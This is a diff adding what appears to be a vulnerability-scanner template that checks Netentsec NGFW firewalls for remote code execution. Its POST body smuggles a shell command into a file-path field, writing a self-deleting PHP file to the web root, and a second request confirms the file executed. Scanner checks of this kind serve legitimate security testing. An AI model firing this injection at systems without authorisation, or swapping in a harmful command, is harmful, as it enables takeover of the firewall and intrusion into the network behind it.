@@ -1,0 +1,24 @@
+id: netentsec-ngfw-rce
+
+info:
+    name: Netentsec Ngfw RCE
+    author: YekkoY
+    severity: critical
+
+set:
+    r2: randomLowercase(10)
+rules:
+    r0:
+        request:
+            method: POST
+            path: /directdata/direct/router
+            body: |
+                {"action":"SSLVPN_Resource","method":"deleteImage","data":[{"data":["/var/www/html/d.txt;echo '<?php echo md5({{r2}});unlink(__FILE__);?>' >/var/www/html/{{r2}}.php"]}],"type":"rpc","tid":17}
+        expression: response.status == 200 && response.body.bcontains(b"SSLVPN_Resource") && response.body.bcontains(b"\"result\":{\"success\":true}")
+    r1:
+        request:
+            method: GET
+            path: /{{r2}}.php
+        expression: response.status == 200 && response.body.bcontains(bytes(md5(r2)))
+expression: r0() && r1()
+
